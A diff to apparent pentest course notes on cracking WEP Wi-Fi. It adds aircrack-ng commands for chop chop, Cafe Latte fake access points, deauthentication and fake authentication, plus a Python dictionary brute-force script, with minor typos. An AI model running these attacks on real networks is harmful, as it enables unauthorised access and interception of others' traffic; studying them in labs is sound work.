@@ -1,11 +1,21 @@
 ---
 tags:
+  - knowledge-base
   - wep
   - aireplay-ng
   - airmon-ng
   - airodump-ng
   - wi-fi
+  - korek
+  - arpreplay
+  - fragmentation
+  - aircrack-ng
+  - cafelatte
+  - airbase-ng
+  - airdecap-ng
+category: wifi
 ---
+
 ## WEP Overview
 
 Open networks are vulnerable to eavesdropping because their traffic is not encrypted. To address this, Wired Equivalent Privacy (WEP) was introduced in 1997 as part of the [IEEE 802.11](https://www.ieee802.org/11/) standard. It aimed to provide a level of privacy for data transmitted over wireless networks.
@@ -46,7 +56,7 @@ The use of WEP is less common in modern environments, but can still be encounter
 
 Wired Equivalent Privacy utilizes 40-bit or 104-bit keys in combination with a 24-bit initialization vector to create the seed. Due to the correlation between the two, the [FMS (Fluhrer, Mantin, and Shamir)](https://en.wikipedia.org/wiki/Fluhrer,_Mantin_and_Shamir_attack) and [PTW (Pyshkin, Tews, and Weinmann)](https://eprint.iacr.org/2007/120.pdf) attacks allow us to retrieve a correct key after gathering enough packets. Alternatively, brute force attacks exist on a per-packet basis, which also allow us to retrieve the key. Packet-building attacks, such as ARP replay, fragmentation, and others, enable us to expedite the process of initialization vector generation. The goal is to collect enough initialization vectors in a capture file to crack the key using probability algorithms.
 
-![[wep_encryption_algorithm_overview.png]]
+![wep_encryption_algorithm_overview](../../Images/HTB/wep_encryption_algorithm_overview.png)
 
 The algorithm for WEP follows a fairly standard procedure for generating a keystream through the RC4 algorithm, which then undergoes a bitwise operation with the packet plaintext and cyclic redundancy check. It can be broken down into the following steps:
 
@@ -272,7 +282,7 @@ sudo airmon-ng start wlan0
 We begin by scanning the target access point using `airodump-ng`, capturing the communication into a file. The interface in monitor mode is specified using `wlan0mon`, the access point's channel with `-c`, and the output location with the `-w` argument.
 
 ```bash
-sudo airodump-ng wlan0mon -c1 -w WEP
+sudo airodump-ng wlan0mon -c 1 -w WEP
 ```
 
 Next, we initiate the fragmentation attack with the following command. The `-5` option indicates the fragmentation attack, while `-b` specifies the BSSID of the AP, and `-h` is the MAC address of the connected station (or any source address that can associate with the AP).
@@ -317,3 +327,311 @@ Once enough packets have been gathered, we can use aircrack-ng to crack the WEP 
 sudo aircrack-ng -b XX:XX:XX:XX:XX:XX WEP-01.cap
 ```
 
+### Korek Chop Chop
+
+[Korek Chop Chop Attack](https://www.aircrack-ng.org/doku.php?id=korek_chopchop) captures a packet and retrieves the 1500 bytes of PRGA. Known technically as an `Inverse Arbaugh` attack, chop chop uses inductive reasoning to decrypt the packet without needing the key.
+
+This is achieved by abusing the Integrity Check Value (ICV) in WEP. If we recall, the ICV ensures the integrity of the transmitted message. In the case of WEP, the CRC32 algorithm is used to calculate this value; if the ICV of a packet is not valid, it will be dropped by the access point (AP) upon receipt. This seemingly benign interaction creates an opportunity for attackers.
+
+The attack works like this: after capturing a legitimate packet, the last byte of the encrypted message is removed and assigned a value (from 0-255) that we guess, starting at zero. A series of [calculations](https://www.aircrack-ng.org/doku.php?id=chopchoptheory) is performed to determine the ICV of the truncated packet, which has a mathematical relationship to the value of the missing byte. This new packet is sent into the network as we await the AP's response. If the packet is dropped, we guess a different number and try again. If the packet isn't dropped, it means our guess was correct, thus revealing the true value of the byte. We then "chop off" the next byte and repeat the process. As the packet is decrypted byte by byte, we are able to recover the PRGA simultaneously.
+
+With the resulting keystream data (.xor file), we are able to craft and encrypt packets that look legitimate within the network. This allows us to subsequently perform the ARP request replay attack.
+
+We first need to enable monitor mode on our wireless network interface. This allows us to capture and inject packets.
+
+```bash
+sudo airmon-ng start wlan0
+```
+
+Scan our target access point using `airodump-ng` and capture the communication into a file. We specify our interface in monitor mode with `wlan0mon`, the channel our access point is running on with `-c`, and the location to save the capture file with the `-w` argument.
+
+```bash
+sudo airodump-ng wlan0mon -c 1 -w WEP
+```
+
+Next, we initiate the `KoreK chop chop` attack in a second terminal. The source MAC address used should be capable of associating with the network. If we need to conduct the attack without authentication and association, there are two options: either omit the `-h` flag (though this can result in dropped packets), or specify the MAC address of an already connected station, which tends to be more reliable. The `-4` option in `aireplay-ng` is used for the KoreK chop chop attack.
+
+Similar to fragmentation attacks, we want to capture a packet originating from a connected station and destined for the AP. Once a valid packet is found, we approve the selection and start the attack, retrieving the PRGA keystream bit by bit.
+
+```bash
+sudo aireplay-ng -4 -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
+```
+
+Analyze the decrypted packet to identify the source and destination IP addresses.
+
+```bash
+sudo tcpdump -s 0 -n -e -r replay_dec-XXXX-XXXXXX.cap
+```
+
+After identifying the required IP addresses, we can forge an ARP request using `packetforge-ng`. In this command, we specify the access point's MAC address with `-a`, the station’s MAC address with `-h`, the access point’s IP address with `-k`, the station’s IP address with `-l`, the location and name of our PRGA file with `-y`, and finally, the output name for the forged ARP request capture file with `-w`.
+
+```bash
+sudo packetforge-ng -0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX -k 192.168.1.1 -l 192.168.1.42 -y replay_dec-XXXX-XXXXXX.xor -w forgedarp.cap
+```
+
+Once the forged packet is saved as `forgedarp.cap`, we can inject it into the target network to generate initialization vectors (IVs). One common way to do this is by using [Interactive Packet Replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay).
+
+We do so by specifying the interactive packet replay mode with `-2`, the name and location of our forged packet with `-r`, the source MAC address to inject with `-h`, and our interface in monitor mode with `wlan0mon` as shown below.
+
+```bash
+sudo aireplay-ng -2 -r foredarp.cap -h XX:XX:XX:XX:XX:XX wlan0mon
+```
+
+As this process runs, back in the `airodump-ng` output we can notice that the **Frames** count for the connected station increases. This is a positive sign that many new IVs are being generated.
+
+We can wait until enough packets have been generated before attempting to crack the WEP key. Additionally, to further accelerate the IV generation process, we can use an ARP request replay attack in a new terminal. This approach will expedite the overall process.
+
+```bash
+sudo aireplay-ng -3 -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
+```
+
+Once we have generated enough packets, we can use `aircrack-ng` to crack the WEP key using the captured Initialization Vectors (IVs) stored in the `WEP-01.cap` file.
+
+```bash
+sudo aircrack-ng -b XX:XX:XX:XX:XX:XX WEP-01.cap
+```
+
+### Cafe Latte
+
+The [Cafe Latte](https://www.aircrack-ng.org/doku.php?id=cafe-latte) attack exploits how WEP clients handle reauthentication requests, enabling attackers to generate traffic and capture enough IVs to crack the WEP key without requiring traffic from the AP.
+
+The `Cafe Latte` attack can directly target the clients instead of requiring traffic.
+
+The Cafe Latte attack is a variation of an ARP Request Replay attack aimed at connected clients. It can be likened to an evil-twin attack for WEP. To execute it, a fake access point with the same BSSID as the target network is created, running in WEP mode, and clients are deauthenticated from the target network, forcing them to reconnect to the fake access point. This setup generates the desired ARP packets, which are replayed repeatedly using the ARP request replay attack to collect enough initialization vectors (IVs) to crack the WEP key.
+
+We first need to enable monitor mode on our wireless network interface. This allows us to capture and inject packets.
+
+```bash
+sudo airmon-ng start wlan0
+```
+
+To begin, we scan our target access point using `airodump-ng` and capture the communication into a file. We specify our interface in monitor mode with `wlan0mon`, the channel our access point is running on with `-c`, and the location to save the capture file with the `-w` argument.
+
+```bash
+sudo airodump-ng wlan0mon -c 1 -w WEP
+```
+
+In a second terminal, we can start the `Cafe Latte` attack using `aireplay-ng`. We specify the Cafe Latte attack mode with `-6`, the BSSID of the target AP with `-b`, and the client MAC address with `-h`. This will listen for a station to connect, and replay any captured ARP requests to the client.
+
+```bash
+sudo aireplay-ng -6 -D -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
+```
+
+Once the Cafe Latte listener is running, the next step is to launch a fake access point in a third terminal. The ESSID and BSSID of this access point must match those of the target network to deceive de-authenticated clients into reconnecting and sharing their ARP requests. The `airbase-ng` tool is used to create this fake access point, with identical BSSID and ESSID to the target, operating on the same channel. Use the `-a` flag to specify the BSSID of the target AP, `-e` to set the ESSID, `-c` to select the channel, `-L` to initiate the Cafe Latte attack mode, and `-W 1` to enable WEP mode. For a complete list of command options and arguments for `airbase-ng`, refer to the documentation [here](https://www.aircrack-ng.org/doku.php?id=airbase-ng).
+
+```bash
+sudo airbase-ng -c 1 -a XX:XX:XX:XX:XX:XX -e "TargetWiFi" wlan0mon -W 1 -L 
+```
+
+This will listen for a station to connect and replay any captured ARP requests to the client. This setup will de-authenticate de-authenticated clients into reconnecting to our network, allowing us to capture their ARP requests for further analysis and attack.
+
+Once our access point is up, we can de-authenticate the station in a fourth terminal using `aireplay-ng` to force the clients to reconnect to our fake access point.
+
+```bash
+sudo aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX wlan0mon
+```
+
+When the target station is de-authenticated, we should see changes in our second and third terminal that are indicative of our attack succeeding.
+
+Once we have generated enough packets, we can use `aircrack-ng` to crack the WEP key using the captured initialization vectors (IVs) stored in the WEP-01.cap file.
+
+```bash
+sudo aircrack-ng -b XX:XX:XX:XX:XX:XX WEP-01.cap
+```
+
+> [!INFO]  While executing the Cafe Latte attack, if no ARP packets are generated, it is recommended to rerun the de-authentication attack using "aireplay-ng" then immediately execute the "airbase-ng" command.
+
+### Attacking WEP Access Points without Clients
+
+Suppose our target network does not have any wireless clients connected and there are no ARP requests coming from any Ethernet-connected stations. In this scenario, we can perform a special `Fragmentation` or `KoreK chop chop` attack in combination with [fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication). It's important to note that while this method works on some networks, it is not universally effective, and ultimately depends on whether the network is vulnerable to fake authentication or not.
+
+We will need three terminals for this attack. In the first terminal, we scan the target network and capture its communications using `airodump-ng`.
+
+```bash
+sudo airmon-ng start wlan0
+```
+
+Once this is running, in our second terminal we will begin packet crafting attempts. This involves using our interface's MAC address to authenticate with the access point. We employ the following command, specifying fake authentication with `-1`, the re-association interval with `1000`, the ESSID of the network with `-e`, the BSSID with `-a`, our MAC address with `-h`, and the keep-alive request interval with `-q`. Additionally, we use `-o 1` to send only one set of packets at a time.
+
+```bash
+sudo aireplay-ng -1 1000 -o 1 -q 5 -e "WirelessNetwork" -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
+```
+
+> [!INFO] We supply our own interface's MAC address (00:c0:ca:98:3e:e0) as the attacker.
+
+In the `airodump-ng` output, we can confirm that fake authentication was successful as our MAC address now appears as a client connected to the AP.
+
+Then, in a third terminal, we initiate either a fragmentation or KoreK chop chop attack. To start a KoreK chop chop attack, we use the following command, specifying the access point's BSSID with `-b` and our interface's MAC address with `-h`.
+
+```bash
+sudo aireplay-ng -4 -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
+```
+
+Once we have successfully captured the PRGA keystream to a `.xor` file, we will use `packetforge-ng` to forge a packet and inject it into the network with no stations. We do so with the following command, specifying the access point MAC with `-a`, our associated interface MAC with `-h`, our guessed source IP with `-l`, our guessed destination IP with `-k`, our replay file with `-y`, and write destination with `-w`. If we do not know the IP, we could just use `255.255.255.0` or `255.255.255.255`.
+
+```bash
+sudo packetforge-ng -0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX -k 192.168.1.1 -l 192.168.1.42 -y replay_dec-XXXX-XXXXXX.xor -w forgedarp.cap
+```
+
+Now that we have a forged ARP packet, we can inject it back into the network. We do so with the following command:
+
+```bash
+sudo aireplay-ng -2 -r forgedarp.cap wlan0mon
+```
+
+Once this is going, we wait several moments as the initialization vectors generate. We could also start an ARP request replay attack to speed things up, as we have done previously. Once enough traffic is generated, we can attempt to crack the key with `aircrack-ng`.
+
+```bash
+sudo aircrack-ng -b XX:XX:XX:XX:XX:XX WEP-01.cap
+```
+
+It is worth noting that fake authentication is mostly only effective with older routers, as newer routers do not generate broadcast requests when connected via fake authentication.
+
+### WEP Cracking
+ 
+ It is also possible to save only the captured initialization vectors using the `--ivs` option in `airodump-ng`. Once enough IVs are captured, we can utilize the `-K` option in aircrack-ng, which invokes the Korek WEP cracking method to crack the WEP key.
+
+Start monitor mode
+
+```bash
+sudo airmon-ng start wlan0
+```
+
+Capture IVs
+
+```bash
+sudo airodump-ng wlan0mon -c 1 -w WEP --ivs
+```
+
+Crack once enough IVs are captured
+
+```bash
+sudo aircrack-ng -K WEP.ivs
+```
+
+When attempting to crack WEP encryption, attackers typically gather enough encrypted packets using tools like `airodump-ng` and then use `aircrack-ng` to successfully decipher the key. However, there are situations where the available packet count isn't sufficient for online cracking. In such cases, the attacker may switch to an offline approach, using `dictionary` or `brute-force` methods to try and break the key.
+
+To perform a brute-force attack, we can attempt to decrypt the packet using `airdecap-ng` with each password from the list. If a packet is successfully decrypted, it indicates that we have found the correct WEP key.
+
+We can write a Python script that converts each 5-character password from the password list into its hexadecimal equivalent and then uses a loop to test each one with `airdecap-ng` to check if it successfully decrypts the traffic.
+
+```python
+import sys
+import binascii
+import re
+from subprocess import Popen, PIPE
+import time
+
+# Start timer
+start_time = time.time()
+
+# File paths
+cap_file = '/opt/WEP-01.cap'
+wordlist_path = '/opt/1000000-password-seclists.txt'
+wordlist = []
+
+# Read wordlist file to a list
+with open(wordlist_path, 'r') as f:
+    wordlist = f.readlines()
+
+# Iterate over the wordlist
+for ln, word in enumerate(wordlist, start=1):
+    # Clean the line to remove non-alphanumeric characters
+    key = re.sub(r'\W+', '', word)
+
+    # Filter wordlist to only keep 5-character long words
+    if len(key) != 5 :
+        continue
+
+    # Encode the WEP key to bytes and convert to hexadecimal
+    hex_key = binascii.hexlify(key.encode('utf-8'))
+
+    # Print the current attempt
+    print(f"{ln}: Trying Key: {key} Hex: {hex_key}")
+
+    # Run airdecap-ng with the current WEP key
+    p = Popen(['/usr/bin/airdecap-ng', '-w', hex_key, cap_file], stdout=PIPE)
+    output = p.stdout.read().decode("utf-8")
+
+    # Check if the key was successful
+    if int(output.split('\n')[5][-1]) > 0:
+        print(f"Success! WEP key found: {key}")
+        end_time = time.time()
+        print(f"Total time: {end_time - start_time:.6f} seconds")
+        sys.exit(0)
+
+# If no key was found
+print("No WEP key found")
+```
+
+The capture file `WEP-01.cap` is assigned to the `capture_file` variable, while the password list is loaded into the `wordlist` variable. The script then iterates through the list of passwords in a for-loop, using `airdecap-ng` to test each one. Afterwards, the script checks the output for the line containing `'Number of decrypted WEP packets'`. If the number of decrypted packets is greater than 0, it indicates that the packet was successfully decrypted and the correct WEP key has been found.
+
+```bash
+sudo python3 wep_bruteforce.py
+```
+
+With the correct key in hand, we can now decrypt any WEP-encrypted data captured during the session using `airdecap-ng`, allowing further analysis of network traffic using tools like Wireshark.
+
+```bash
+sudo airdecap-ng -w 000000000b WEP-01.cap
+```
+
+After successfully decrypting the WEP traffic with airdecap-ng, a new file will be generated, typically named something similar to `WEP-01-dec.cap`.
+
+Opening this file in Wireshark reveals that the traffic has indeed been decrypted. We can now view the plaintext content, including network protocols, payload data, and any other information that once veiled by ciphertext.
+
+We can also use the WEP key `'000000000b'` to connect to the Wi-Fi network.
+
+## Connecting to WEP with the Key
+
+### GUI
+
+Connect with the GUI and use the hex key as the password with no colons.
+
+### nmcli
+
+```bash
+sudo nmcli dev wifi connect <ESSID> password 00000000
+```
+
+### wpa_supplicant
+
+```bash
+cat > wep.conf << 'EOF'
+network={
+	ssid="PixelForge"
+	key_mgmt=NONE
+	wep_key0=1B2A5A4C6A
+	wep_tx_keyidx=0
+}
+EOF
+```
+
+```bash
+sudo wpa_supplicant -c wep.conf -i wlan0
+```
+
+With the above still running, open a new terminal and run the following
+
+```bash
+sudo dhclient wlan0
+```
+
+### iwconfig
+
+```bash
+sudo ip link set wlan0 down
+sudo iwconfig wlan0 mode managed
+```
+
+```bash
+sudo iwconfig wlan0 essid PixelForge key 1B2A5A4C6A
+```
+
+```bash
+sudo iwconfig
+```
+
+```bash
+sudo dhclient wlan0
+```
